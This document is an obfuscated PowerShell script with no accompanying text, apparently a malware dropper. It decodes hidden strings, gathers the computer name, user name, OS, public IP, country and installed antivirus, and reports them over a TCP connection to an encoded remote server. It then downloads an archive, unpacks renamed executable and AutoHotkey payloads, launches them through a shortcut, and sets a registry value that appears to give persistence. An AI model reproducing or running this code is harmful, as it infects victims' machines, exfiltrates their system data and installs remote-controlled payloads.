function Dzg7oCzc77 { -join ((65..90) + (97..122) | Get-Random -Count $args[0] | % { [char]$_ }) } function xq4rxes72d { param ( [string]$FFF ) $JSybqPlKOp = "5VANV4SDMC3VEAFR8S2M3M9U6WRH3P7FDD9T9Q10IAG5WZJ5K5" if ($FFF -eq '') { return '' } $rz6R9RzSrF = '' $Ob58M3Gx6O = $JSybqPlKOp.Length $OCJFvCBJfe = 0 $cB4OGDmcjn = [convert]::ToInt32($FFF.Substring(0, 2), 16) $eE6OUNx8uQ = 2 while ($eE6OUNx8uQ -lt $FFF.Length) { $FuccGB1d3t = [convert]::ToInt32($FFF.Substring($eE6OUNx8uQ, 2), 16) if ($OCJFvCBJfe -lt $Ob58M3Gx6O) { $OCJFvCBJfe++ } else { $OCJFvCBJfe = 1 } $bf37JGO8xI = $FuccGB1d3t -bxor [byte][char]$JSybqPlKOp[$OCJFvCBJfe - 1] if ($bf37JGO8xI -le $cB4OGDmcjn) { $bf37JGO8xI = 255 + $bf37JGO8xI - $cB4OGDmcjn } else { $bf37JGO8xI = $bf37JGO8xI - $cB4OGDmcjn } $rz6R9RzSrF += [char]$bf37JGO8xI $cB4OGDmcjn = $FuccGB1d3t $eE6OUNx8uQ += 2 } return $rz6R9RzSrF } function dmXl655hdj { $Kw9ean51r1 = xq4rxes72d -FFF "93CE15C877E723012ED37EDF103A29D4167DB41AC400" $uOeUeaW6A3 = New-Object System.Net.WebClient $response = $uOeUeaW6A3.DownloadString($Kw9ean51r1) $gwk0rNq4so = $response -replace '"', '' -replace '{', '' -replace '}', '' -split ',' $XvXEY2Lzit = @{} foreach ($TohcpkX7Ya in $gwk0rNq4so) { $HZWCrVFJEJ = $TohcpkX7Ya -split ':' $XvXEY2Lzit.Add($HZWCrVFJEJ[0].Trim(), $HZWCrVFJEJ[1].Trim()) } return $XvXEY2Lzit } function fXlcyt5AN5 { $W5uVlEi5Q8 = xq4rxes72d -FFF "13B076A457E50D21C07BAE2BC906082BCB788E3328" $uR2V5BL7ht = xq4rxes72d -FFF "6FF76BF672E30C7FED43CA2E2B3D1C1BDB6882EA19B863EF15B17688B52ACE" try { $ekNjQWnadq = Get-WmiObject -Namespace $W5uVlEi5Q8 -Query $uR2V5BL7ht -ErrorAction Stop if ($ekNjQWnadq) { return $ekNjQWnadq.displayName } else { return xq4rxes72d -FFF "165196F717D37CB6699F51F53F1A3FE20552E66983D44E" } } catch { return xq4rxes72d -FFF "2040F81B33C91B68984526AB47FE30DF17B5485AF65687C91548ED31EC3EF751F125D3788D3BF554F268" } } function RO5K8RLMLZ { param ( [string]$serverAddress, [int]$port, [string]$destinationPath ) try { $MTLy9Hr37Q = New-Object System.Net.Sockets.TcpClient($serverAddress, $port) Write-Output "$port..." $uWJr1zbTTs = $MTLy9Hr37Q.GetStream() $okf0iTBThg = New-Object System.IO.StreamWriter($uWJr1zbTTs) $okf0iTBThg.AutoFlush = $true $K0zhkSCR8Y = New-Object System.IO.StreamReader($uWJr1zbTTs) # Enviar informa��es do cliente primeiro $HxNsAvyWkx = "$((Get-Date).ToString('dd/MM/yyyy HH:mm:ss')) | $q0KG98oClI | $zJuTf1702r | $V4kOUiSxut | $Fa7lhBsAeU | $Idd3QwjKFh | $GElpP7ipEU" $okf0iTBThg.WriteLine($HxNsAvyWkx) $response = $K0zhkSCR8Y.ReadLine() Write-Output "$response" if ($response -eq (xq4rxes72d -FFF "81FF181F20294FC74FD960859CA5")) { # Enviar comando para solicitar o arquivo $FHlIgGdAPl = xq4rxes72d -FFF "688E859298A1D34EDE69" $okf0iTBThg.WriteLine($FHlIgGdAPl) $response = $K0zhkSCR8Y.ReadLine() Write-Output "$response" if ($response -eq (xq4rxes72d -FFF "4EA1BC48C375FC111B121855CA")) { $JvJIwY4wUO = [System.IO.File]::Create($destinationPath) $aRrKfACm5L = New-Object byte[] 1024 $neNqNMdwfe = 0 try { while (($neNqNMdwfe = $uWJr1zbTTs.Read($aRrKfACm5L, 0, $aRrKfACm5L.Length)) -gt 0) { $JvJIwY4wUO.Write($aRrKfACm5L, 0, $neNqNMdwfe) } $JvJIwY4wUO.Close() Write-Output "" } catch { Write-Output "" } finally { $JvJIwY4wUO.Close() } $finalResponse = $K0zhkSCR8Y.ReadLine() Write-Output "" } elseif ($response -eq (xq4rxes72d -FFF "7DF6162326D31636CE63EA09081316")) { Write-Output "" } } $okf0iTBThg.Dispose() $K0zhkSCR8Y.Dispose() $uWJr1zbTTs.Dispose() $MTLy9Hr37Q.Dispose() Write-Output "" } catch { Write-Output "" } } $v39f0CH6Uw = $env:LOCALAPPDATA $S0X2X2DcBH = "$v39f0CH6Uw\$([System.DateTime]::Now.ToString('ddMMyyyy'))" $c31OqrDC21 = [System.IO.File]::Exists($S0X2X2DcBH) if (-Not $c31OqrDC21) { "" | Set-Content $S0X2X2DcBH $V2SRdkEBg7 = Dzg7oCzc77 8 $V2SRdkEBg7 = "$v39f0CH6Uw\$V2SRdkEBg7\" New-Item -ItemType directory -Path $V2SRdkEBg7 $xOFhO08AcD = Dzg7oCzc77 8 $xOFhO08AcD = "$V2SRdkEBg7$xOFhO08AcD.zip" $serverAddress = xq4rxes72d -FFF "97FD78ED52D23734261506076EE359" $port = 8900 $zJuTf1702r = $env:computername $V4kOUiSxut = $env:username $Fa7lhBsAeU = (Get-WmiObject -class Win32_OperatingSystem).Caption $Idd3QwjKFh = fXlcyt5AN5 $gwk0rNq4so = dmXl655hdj $GElpP7ipEU = $gwk0rNq4so.ip $q0KG98oClI = $gwk0rNq4so.country RO5K8RLMLZ -ServerAddress $serverAddress -port $port -destinationPath $xOFhO08AcD if (Test-Path $xOFhO08AcD) { $MZkUyfWzSI = New-Object System.Collections.ArrayList $WQ6S2p2tpg = New-Object -com shell.application $YADJI1oPf3 = $WQ6S2p2tpg.NameSpace($xOFhO08AcD) if ($YADJI1oPf3) { foreach ($TohcpkX7Ya in $YADJI1oPf3.items()) { $WQ6S2p2tpg.Namespace($V2SRdkEBg7).copyhere($TohcpkX7Ya) $MZkUyfWzSI.Add($TohcpkX7Ya.name) } } else { Write-Host "" exit } $FkZE9kEoZk = New-Object System.Collections.ArrayList $r5zF0aPduQ = New-Object -com shell.application $SgH0AaVoV6 = $r5zF0aPduQ.NameSpace($xOFhO08AcD) if ($SgH0AaVoV6) { foreach ($TohcpkX7Ya in $SgH0AaVoV6.items()) { $FkZE9kEoZk.Add($TohcpkX7Ya.name) } } else { Write-Host "" exit } } else { Write-Host "" exit } $qr1fCQ2Quw = Dzg7oCzc77 4 $OIrMy9EQee = Dzg7oCzc77 10 $oFuVpJyVNY = Dzg7oCzc77 3 $eyPJ29ZvXS = $V2SRdkEBg7 + $oFuVpJyVNY + ".exe" $tgWklW5UUK = Dzg7oCzc77 3 $x8Zvh0s8wg = $V2SRdkEBg7 + $oFuVpJyVNY + ".ahk" foreach ($ReldHKWJg5 in $FkZE9kEoZk) { Write-Host "" $jcUIxRg4Qq = (Get-Item "$V2SRdkEBg7$ReldHKWJg5").Length if ($ReldHKWJg5 -eq 'ssleay32.dll' -or $ReldHKWJg5 -eq 'libeay32.dll') { Write-Host "" continue } if ($ReldHKWJg5.EndsWith("sss")) { Write-Host "" Rename-Item -Path "$V2SRdkEBg7$ReldHKWJg5" -NewName $eyPJ29ZvXS } elseif ($ReldHKWJg5.EndsWith("uuu")) { Write-Host "" Rename-Item -Path "$V2SRdkEBg7$ReldHKWJg5" -NewName $x8Zvh0s8wg } else { Write-Host "" } } $JzycmGnMph = .("{0}{2}{1}"-f 'New-Obj','ct','e') -ComObject ("{0}{2}{1}{3}"-f 'W','t.She','Scrip','ll') $MtCd2z0lWH = $JzycmGnMph.CreateShortcut("$v39f0CH6Uw\" + $oFuVpJyVNY + ".lnk") $MtCd2z0lWH.TargetPath = $eyPJ29ZvXS $MtCd2z0lWH.Description = $x8Zvh0s8wg $MtCd2z0lWH.Arguments = """$x8Zvh0s8wg"" " $MtCd2z0lWH.WorkingDirectory = $V2SRdkEBg7 $MtCd2z0lWH.Save() Start-Process ("$v39f0CH6Uw\" + $oFuVpJyVNY + ".lnk") Remove-Item $xOFhO08AcD $XSLb3m5Hmx = xq4rxes72d -FFF "2C41DA5FFA638B8DB85285CF679C43D975E619B964E41946EF7A86BD64FB3B85BE5FE66583CC63E065F219CC7589A25B829F20BB" set-itemproperty $XSLb3m5Hmx $qr1fCQ2Quw ("$v39f0CH6Uw\" + $oFuVpJyVNY + ".lnk") } 
